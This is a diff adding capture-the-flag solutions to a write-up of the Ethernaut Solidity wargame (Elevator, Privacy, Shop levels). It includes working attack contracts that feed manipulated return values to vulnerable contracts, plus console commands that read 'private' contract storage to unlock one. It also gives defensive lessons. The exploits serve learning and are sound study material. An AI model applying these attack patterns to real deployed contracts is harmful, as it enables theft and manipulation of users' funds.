@@ -431,5 +431,149 @@ The attack function first sends some ether to the challenge contract in order to
 Re-entrancy is one of the most simple and popular attacks till date. To prevent re-entrancy we should always update the balances and state variables before sending out ether. Other techniques like invoking a lock of the contract untill a particular transaction is completed can also be useful.
 
 ___
+## Level 11 [Elevator]
+
+The trick to solve this challenge is to write a function that gives a different output based on the input.
+
+```solidity
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+```
+
+When the `goTo()` function is called in the challenge contract, notice that in the if block, the `isLastFloor()` function must return `false` to enter the next code block, wherein, the same function must evaluate to `true`, to make the value of the `top` variable true and hence win the challenge. I have done this using a variable `count` that keeps a track of how many times the `isLastFloor()` function has been called. Since, we need the function to return `false` for the first call and `true` for the second call, I simply used the statement `return count > 1 ? true : false;` to realise this funtionality.
+
+Find the attack contract given below - 
+
+```solidity
+contract hack {
+    Elevator private immutable target;
+    uint private count;
+    constructor (address _target) {
+        target = Elevator(_target);
+    }
+
+    function attack () external {
+        target.goTo(1);
+        require (target.top(), "challenge failed");
+    }
+
+    function isLastFloor (uint) external returns (bool) {
+        count++;
+        return count > 1 ? true : false;
+    }
+}
+```
+
+___
+## Level 12 [Privacy]
+
+This level helps us understand how data is stored in the blockchain.
+
+```solidity
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+```
+
+We can see that we have got a number of variables associated to various data types present in the contract. Now, we need to remember that data is stored in slots in the blockchain, and each slot can store a maximum of 32 bytes. Multiple variables can be stored in the same slot if there is still space to store a second variable completely in a slot even after storing the first variable. Find the list of which variable will be stored in what slot below -
+
+```
+  bool public locked --> slot [0] (takes up 1 byte)
+  uint256 public ID --> slot [1] (takes up 32 bytes)
+  uint8 private flattening --> slot [2] (takes up 1 byte)
+  uint8 private denomination --> slot [2] (takes up 1 byte)
+  uint16 private awkwardness --> slot [2] (takes up 2 bytes)
+  bytes32[3] private data --> slot [3], [4] and [5] (takes up 32 bytes each)
+```
+Each element of the bytes32 array takes of 32 bytes, hence occupying one slot each. Now, we can see in the `unlock()` function that key required to change the state of the locked variable is stored in the 2nd index of the `data` array, i.e. the 3rd element, which will basically e stored in slot [5]. We can easily retrieve that using the web3 library in the developer console like we did for Level 8.
+
+Find the list of commands to solve the challenge below -
+
+```javascript
+await web3.eth.getStorageAt(contract.address, 5)
+
+x = '0xc07a228bd67b8bdfc343b911d02fb5fb9093d40d7704f4c7ce67d0bc55e9d88f'
+
+x.slice(0, 34)
+
+await contract.unlock('0xc07a228bd67b8bdfc343b911d02fb5fb')
+```
+
+The first command gives the required key, which is 32 bytes. However, in the challenge contract, we can see that the key that is taken as input to unlock the contract is 16 bytes. This can easily be achieved by choosing the first 16 bytes of the key we found. Now, 32 bytes hex means we have got 64 characters plus the '0x' at the begining. So, to choose the first 16 bytes, we will need the first 34 characters of the key string (2character for '0x' + 32 characters for the first 16 bytes). So, we have stores the retrieved string in a variable, and sliced it to get the first 34 characters, which is then passed to the unlock function to complete the challenge.
+
+___
+## Level 21 [Shop]
+
+This idea behind this level is similar to level 11 [Elevator].
+
+```solidity
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+```
+
+The goal is to set the value of the price variable to a number less than 100. And, looking at the `buy()` function, our first idea would be to implement the same logic that we did for Level 11, i.e., we create a function `price()` and a variable count, and we update the value of count in every call of the function, so that, when the function is called the 2nd time, we can return a different value than what we did for the first call. However, there is a minor problem. In the interface declared in the challenge contract, the function `price()` is defined as `view` which means we can't make any changes to state variables. So, if a variable count is declared, there will be a conflict here, hence this logiccan't be implemented. But, notice the `isSold` variable. It's value changes after the first call to the `price()` function, hence this variable can be used to perform the checks based on which we can decide the output of the `price()` function.
+
+Find the attack contract below -
+
+```solidity
+contract hack {
+    Shop private immutable target;
+
+    constructor (address _target) {
+        target = Shop(_target);
+    }
+
+    function attack () external {
+        target.buy();
+    }
+
+    function price() external view returns (uint) {
+        if (target.isSold()) {
+            return 0;
+        }
+
+        return 100;
+    }
+}
+```
+
+So, the key takeaway from this level is that we should never change the state of our contract based on an unknown contract's logic, otherwise, our contract can be easily manipulated by other external contracts.
+
+
 
 # More solutions coming soon!
